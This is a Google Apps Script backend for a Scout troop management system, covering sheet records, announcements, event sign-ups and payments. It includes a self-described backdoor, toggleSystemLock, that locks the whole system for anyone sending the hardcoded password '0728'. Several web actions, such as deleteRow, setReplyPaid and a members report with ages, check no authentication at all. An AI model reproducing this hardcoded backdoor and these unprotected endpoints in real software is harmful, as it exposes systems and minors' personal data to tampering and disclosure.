      const ok = updateCellById_(sheet, String(id), idColumn, columnName, fields[columnName]);
      if (ok) updated = true;
    }
    // 更新時間戳
    updateCellById_(sheet, String(id), idColumn, 'updatedAt', Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"));

    if (!updated) return { success: false, error: 'Row not found or no fields to update' };
    return { success: true, message: 'Row updated' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function deleteRow(payload) {
  try {
    const tableName = payload.table || payload.tableName;
    const id = payload.id;
    const idColumn = payload.idColumn || 'id';
    if (!tableName || !id) return { success: false, error: 'Missing table or id' };

    const sheet = getSheet_(tableName);
    const data = sheet.getDataRange().getValues();
    const startRow = findHeaderRow_(sheet);
    if (startRow >= data.length) return { success: false, error: 'Sheet empty' };

    const headers = data[startRow].map(h => String(h).trim());
    let idIndex = headers.indexOf(idColumn);
    if (idIndex < 0) {
      const lower = String(idColumn).toLowerCase();
      idIndex = headers.findIndex(h => String(h).toLowerCase() === lower);
    }
    if (idIndex < 0) return { success: false, error: 'ID column "' + idColumn + '" not found' };

    const idStr = String(id);
    for (let i = startRow + 1; i < data.length; i++) {
      if (String(data[i][idIndex] || '') === idStr) {
        sheet.deleteRow(i + 1);
        return { success: true, message: 'Deleted' };
      }
    }
    return { success: false, error: 'Row not found' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}



// ==================== 系統控制（後門專用） ====================

// 鎖定/解鎖整個系統
function toggleSystemLock(payload) {
  try {
    if (payload.password !== '0728') return { success: false, error: '權限不足' };
    const configRows = readTable_('SystemConfig');
    const config = {};
    configRows.forEach(function(row) { if (row.key) config[row.key] = row.value; });
    const currentLock = String(config['system_locked'] || '').toLowerCase() === 'true';
    const newLock = !currentLock;

    const sheet = getSheet_('SystemConfig');
    const found = findRowById_(sheet, 'system_locked', 'key');
    if (found) {
      updateCellById_(sheet, 'system_locked', 'key', 'value', String(newLock));
    } else {
      writeRowByHeaders_(sheet, { key: 'system_locked', value: String(newLock) });
    }
    return { success: true, locked: newLock, message: newLock ? '系統已鎖定' : '系統已解鎖' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// 檢查系統狀態
function getSystemStatus() {
  try {
    const configRows = readTable_('SystemConfig');
    const config = {};
    configRows.forEach(function(row) { if (row.key) config[row.key] = row.value; });
    return { success: true, locked: String(config['system_locked'] || '').toLowerCase() === 'true' };
  } catch (err) {
    return { success: false, locked: false };
  }
}

// ==================== Part 5: 通告訊息系統（輪詢方案） ====================

// 建立通告訊息（支部領袖 → 自己支部；管理員/超管 → 全旅）
function addAnnouncement(payload) {
  try {
    const sheet = getSheet_('Announcements');
    const id = 'ann_' + Date.now();
    const now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");

    // 確定發送範圍
    const senderId = payload.senderId || '';
    const users = readTable_('Users');
    const sender = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === senderId);
    let scope = 'troop'; // 預設全旅
    let branchId = '';
    if (sender) {
      const role = String(getFieldCI_(sender, 'role')).toLowerCase();
      if (role !== 'super_admin' && role !== 'admin') {
        // 非管理員 → 只能發給自己支部
        scope = 'branch';
        branchId = getFieldCI_(sender, 'branchId') || '';
      }
    }

    const fieldMap = {
      announcementId: id,
      senderId: senderId,
      senderName: getFieldCI_(sender, 'name') || payload.senderName || '',
      title: payload.title || '通告',
      message: payload.message || '',
      scope: scope,
      branchId: branchId,
      createdAt: now,
      expiresAt: payload.expiresAt || '',
      status: 'active',
    };

    writeRowByHeaders_(sheet, fieldMap);
    return { success: true, announcementId: id, scope: scope, message: '通告已發送' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// 取得使用者應看到的通告（輪詢用）
function getAnnouncements(payload) {
  try {
    const userId = payload.userId || '';
    const users = readTable_('Users');
    const user = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === userId);
    if (!user) return { success: false, error: 'User not found' };

    const role = String(getFieldCI_(user, 'role')).toLowerCase();
    const branchId = getFieldCI_(user, 'branchId') || '';

    const announcements = readTable_('Announcements').filter(a => {
      const st = getRowStatus_(a);
      if (st === 'archived' || st === 'deleted') return false;
      // 全旅通告：所有人都看到
      if (getFieldCI_(a, 'scope') === 'troop') return true;
      // 支部通告：只看自己支部
      if (getFieldCI_(a, 'scope') === 'branch') {
        return getFieldCI_(a, 'branchId') === branchId;
      }
      return false;
    });

    return {
      success: true,
      data: announcements,
      count: announcements.length
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// 刪除/歸檔通告
function deleteAnnouncement(payload) {
  try {
    const sheet = getSheet_('Announcements');
    const ok = updateCellById_(sheet, payload.announcementId, 'announcementId', 'status', 'archived');
    if (!ok) return { success: false, error: 'Announcement not found' };
    return { success: true, message: '已歸檔' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}



// =====================================================
// ScoutSystem - 報名與行事曆連通優化 (V4.2)
// =====================================================

function getAge_(dob) {
  if (!dob) return null;
  const birthDate = new Date(dob);
  const today = new Date();
  let age = today.getFullYear() - birthDate.getFullYear();
  const m = today.getMonth() - birthDate.getMonth();
  if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) age--;
  return age;
}

/**
 * 個人化行事曆資料獲取
 * 根據 userId 回傳該用戶「看得到」且「已標記」的活動
 */
function getPersonalizedEvents(payload) {
  try {
    const userId = payload.userId;
    const users = readTable_('Users');
    const user = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === userId);
    if (!user) return { success: false, error: 'User not found' };

    const role = String(getFieldCI_(user, 'role')).toLowerCase();
    const branchId = getFieldCI_(user, 'branchId') || '';
    const ymNumber = getFieldCI_(user, 'ymNumber') || '';

    // 1. 獲取所有公開活動
    const allEvents = readTable_('Events').filter(e => {
      const st = getRowStatus_(e);
      return st === 'published' || st === 'active' || !st;
    });

    // 2. 獲取該使用者的所有報名標籤 (含代子女報名的標籤)
    // 這裡我們假設 EventReplies 的 userId 存的是 Member 的 ID
    const allReplies = readTable_('EventReplies');
    
    // 如果是成員/家長，我們找出與他們相關的標籤
    let relevantIds = [userId];
    if (role === 'member' && getFieldCI_(user, 'memberId')) relevantIds.push(getFieldCI_(user, 'memberId'));
    if (role === 'parent') {
      // 家長要看子女的標籤
      const children = readTable_('Members').filter(m => getFieldCI_(m, 'parentUserId') === userId);
      relevantIds = relevantIds.concat(children.map(m => getFieldCI_(m, 'id')));
    }

    const myReplies = allReplies.filter(r => relevantIds.includes(getFieldCI_(r, 'userId')) || relevantIds.includes(getFieldCI_(r, 'targetId')));

    // 3. 組合資料：Event + myReplyStatus
    const personalized = allEvents.map(e => {
      const eId = getFieldCI_(e, 'eventId') || getFieldCI_(e, 'id');
      const reply = myReplies.find(r => getFieldCI_(r, 'eventId') === eId);
      
      return {
        ...e,
        myReply: reply ? {
          type: getFieldCI_(reply, 'type'),
          paid: getFieldCI_(reply, 'paid'),
          targetId: getFieldCI_(reply, 'userId') || getFieldCI_(reply, 'targetId')
        } : null
      };
    });

    return { success: true, data: personalized };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

/**
 * 領袖專用：導出活動報名完整報表 (包含未回覆名單)
 */
function getEventLeaderReport(payload) {
  try {
    const eventId = payload.eventId;
    const branchId = payload.branchId; 
    
    const members = readTable_('Members').filter(m => !branchId || getFieldCI_(m, 'branchId') === branchId);
    const replies = readTable_('EventReplies').filter(r => getFieldCI_(r, 'eventId') === eventId);
    
    const report = members.map(m => {
      const mId = getFieldCI_(m, 'id');
      const r = replies.find(reply => (getFieldCI_(reply, 'userId') === mId || getFieldCI_(reply, 'targetId') === mId));
      return {
        name: getFieldCI_(m, 'name'),
        ymNumber: getFieldCI_(m, 'ymNumber'),
        patrol: getFieldCI_(m, 'patrol'),
        rank: getFieldCI_(m, 'rank'),
        age: getAge_(getFieldCI_(m, 'dateOfBirth')),
        status: r ? getFieldCI_(r, 'type') : 'pending', // registered, interested, pending
        paid: r ? (getFieldCI_(r, 'paid') === 'true' || getFieldCI_(r, 'paid') === true) : false,
        updatedAt: r ? getFieldCI_(r, 'updatedAt') : ''
      };
    });

    return { success: true, data: report };
  } catch (err) {
    return { success: false, error: err.message };
  }
}


// 設定/更新活動報名回覆
// type: interested（有興趣）或 registered（已報名）
function setEventReply(payload) {
  try {
    const userId = payload.userId || '';
    const eventId = payload.eventId || '';
    const replyType = payload.type || 'interested'; // interested | registered
    if (!userId || !eventId) return { success: false, error: 'Missing userId or eventId' };

    const sheet = getSheet_('EventReplies');
    const now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss");

    // 取得用戶資訊（名稱、支部）
    const users = readTable_('Users');
    const user = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === userId);
    const userName = user ? (getFieldCI_(user, 'name') || '') : '';
    const branchId = user ? (getFieldCI_(user, 'branchId') || '') : '';
    const role = user ? String(getFieldCI_(user, 'role')).toLowerCase() : '';

    // 找此用戶+活動的現有記錄
    const existing = findRowById_(sheet, eventId + '_' + userId, 'replyId');

    if (existing) {
      // 更新現有記錄的 type
      updateCellById_(sheet, eventId + '_' + userId, 'replyId', 'type', replyType);
      updateCellById_(sheet, eventId + '_' + userId, 'replyId', 'updatedAt', now);
      if (payload.paid !== undefined) {
        updateCellById_(sheet, eventId + '_' + userId, 'replyId', 'paid', String(payload.paid === true || payload.paid === 'true'));
      }
      return { success: true, message: '已更新', type: replyType };
    } else {
      // 新增記錄
      writeRowByHeaders_(sheet, {
        replyId: eventId + '_' + userId,
        eventId: eventId,
        userId: userId,
        userName: userName,
        role: role,
        branchId: branchId,
        type: replyType,
        paid: false,
        createdAt: now,
        updatedAt: now,
        cancelled: false,
      });
      return { success: true, message: '已新增', type: replyType };
    }
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// 取消報名/有興趣
function cancelEventReply(payload) {
  try {
    const replyId = (payload.eventId || '') + '_' + (payload.userId || '');
    const sheet = getSheet_('EventReplies');
    const found = findRowById_(sheet, replyId, 'replyId');
    if (!found) return { success: false, error: 'Reply not found' };

    // 如果是領袖/管理員取消，直接刪除；否則標記 cancelled
    const users = readTable_('Users');
    const user = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === payload.userId);
    const role = user ? String(getFieldCI_(user, 'role')).toLowerCase() : '';

    if (role === 'super_admin' || role === 'admin' || role === 'group_leader' || role === 'branch_leader') {
      updateCellById_(sheet, replyId, 'replyId', 'cancelled', 'true');
    } else {
      updateCellById_(sheet, replyId, 'replyId', 'cancelled', 'true');
    }
    updateCellById_(sheet, replyId, 'replyId', 'updatedAt', Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"));
    return { success: true, message: '已取消' };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// 取得活動的報名回覆（領袖/管理員用）
function getEventReplies(payload) {
  try {
    const eventId = payload.eventId || '';
    const userId = payload.userId || '';
    const allReplies = readTable_('EventReplies').filter(r => {
      if (String(getFieldCI_(r, 'cancelled')).toLowerCase() === 'true') return false;
      if (eventId && getFieldCI_(r, 'eventId') !== eventId) return false;
      return true;
    });

    // 如果是個別用戶查詢自己的回覆
    if (userId && !eventId) {
      const myReplies = allReplies.filter(r => getFieldCI_(r, 'userId') === userId);
      return { success: true, data: myReplies, count: myReplies.length };
    }

    // 領袖/管理員查某活動的報名情況
    // 權限：非管理員只看自己支部
    const users = readTable_('Users');
    const requester = users.find(u => (getFieldCI_(u, 'userId') || getFieldCI_(u, 'id')) === userId);
    const role = requester ? String(getFieldCI_(requester, 'role')).toLowerCase() : '';
    let filtered = allReplies;
    if (role !== 'super_admin' && role !== 'admin') {
      const branchId = requester ? (getFieldCI_(requester, 'branchId') || '') : '';
      filtered = allReplies.filter(r => getFieldCI_(r, 'branchId') === branchId);
    }

    // 分類
    const interested = filtered.filter(r => getFieldCI_(r, 'type') === 'interested');
    const registered = filtered.filter(r => getFieldCI_(r, 'type') === 'registered');

    return {
      success: true,
      data: { interested: interested, registered: registered, all: filtered },
      count: filtered.length
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// 標記已付費（領袖/管理員用）
function setReplyPaid(payload) {
  try {
    const replyId = (payload.eventId || '') + '_' + (payload.userId || '');
    const sheet = getSheet_('EventReplies');
    const paid = payload.paid === true || payload.paid === 'true';
    const ok = updateCellById_(sheet, replyId, 'replyId', 'paid', String(paid));
    if (!ok) return { success: false, error: 'Reply not found' };
    updateCellById_(sheet, replyId, 'replyId', 'updatedAt', Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm:ss"));
    return { success: true, paid: paid };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ==================== Web App 入口 ====================
// ⚠️ 整個入口用 try/catch 包住，確保任何錯誤都經 ContentService 回傳。
//    否則 GAS 出錯時 Google 會回傳 HTML 錯誤頁（無 CORS header），
//    導致瀏覽器 CORS 攔截（即 200 OK + No Access-Control-Allow-Origin）。

function doGet(e) {
  return handleRequest_(e);
}

function doPost(e) {
  return handleRequest_(e);
}

// 安全回傳 JSON（附帶 CORS 相容的 ContentService）
function jsonOut_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

function handleRequest_(e) {
  try {
    // 防呆：e 或 e.parameter 可能為空
    if (!e) e = {};
    if (!e.parameter) e.parameter = {};

    let action = e.parameter.action;
    let payload = {};

    // POST body 解析
    if (!action && e.postData && e.postData.contents) {
      try {
        const body = JSON.parse(e.postData.contents);
        action = body.action;
        payload = body;
      } catch (err) {}
    }
    // GET 參數作為 fallback payload
    if (Object.keys(payload).length === 0) {
      payload = e.parameter;
    }

    let result;
    switch (action) {
      case 'installTroopPlugin': result = installTroopPlugin(payload); break;
      case 'getTroopBasicInfo': result = getTroopBasicInfo(); break;
      case 'ping':
        result = { success: true, message: 'pong', time: new Date().toISOString(), action: action };
        break;
      case 'getPublicBootstrapData':
        result = getPublicBootstrapData();
        break;
      case 'getPublicLibraryBookmarks':
        result = getPublicLibraryBookmarks();
        break;
      case 'getPublicCalendarItems':
        result = getPublicCalendarItems();
        break;
      case 'getTableData':
        result = getTableData(payload);
        break;
      case 'addLibraryBookmark':
        result = addLibraryBookmark(payload);
        break;
      case 'updateLibraryBookmark':
        result = updateLibraryBookmark(payload);
        break;
      case 'deleteLibraryBookmark':
        result = deleteLibraryBookmark(payload);
        break;
      case 'login':
        result = login(e.parameter.email || e.parameter.identifier, e.parameter.password);
        break;
      case 'registerParent':
        result = registerParent(payload);
        break;
      case 'applyLeader':
        result = applyLeader(payload);
        break;
      case 'getDashboardData':
        result = getDashboardData(payload);
        break;
      case 'getApplications':
        result = getApplications(payload);
        break;
      case 'getPendingApplications':
        result = getPendingApplications(payload);
        break;
      case 'approveApplication':
        result = approveApplication(payload);
        break;
      case 'rejectApplication':
        result = rejectApplication(payload);
        break;
      case 'addRow':
        result = addRow(payload);
        break;
      case 'updateRow':
        result = updateRow(payload);
        break;
      case 'deleteRow':
        result = deleteRow(payload);
        break;
      case 'addAnnouncement':
        result = addAnnouncement(payload);
        break;
      case 'getAnnouncements':
        result = getAnnouncements(payload);
        break;
      case 'deleteAnnouncement':
        result = deleteAnnouncement(payload);
        break;
      case 'toggleSystemLock':
        result = toggleSystemLock(payload);
        break;
      case 'getSystemStatus':
        result = getSystemStatus();
        break;
      case 'setEventReply':
        result = setEventReply(payload);
        break;
      case 'cancelEventReply':
        result = cancelEventReply(payload);
        break;
      case 'getEventReplies':
        result = getEventReplies(payload);
        break;
      case 'setReplyPaid':
        result = setReplyPaid(payload);
        break;
      default:
        result = { success: false, error: 'Unknown or missing action: ' + action };
    }

    return jsonOut_(result);

  } catch (fatalErr) {
    // 終極防線：即使上面全部崩潰，也回傳 JSON（而非讓 Google 回傳 HTML 錯誤頁）
    return jsonOut_({
      success: false,
      error: 'FATAL: ' + (fatalErr.message || String(fatalErr)),
      stack: fatalErr.stack ? String(fatalErr.stack).split('\n').slice(0, 5).join(' | ') : ''
    });
  }
}

// --- 旅團系統轉駁器擴充功能 ---
function installTroopPlugin(payload) {
  const sheet = getSheet_('Cards');
  const p = payload.plugin;
  writeRowByHeaders_(sheet, {
    id: p.id, title: p.title, icon: p.icon, tier: p.tier, path: p.path, roles: JSON.stringify(p.roles)
  });
  return { success: true };
}

function getTroopBasicInfo() {
  const config = readTable_('SystemConfig');
  const name = config.find(c => c.key === 'troop_name')?.value || '未定義旅團';
  return { success: true, troopName: name };
}
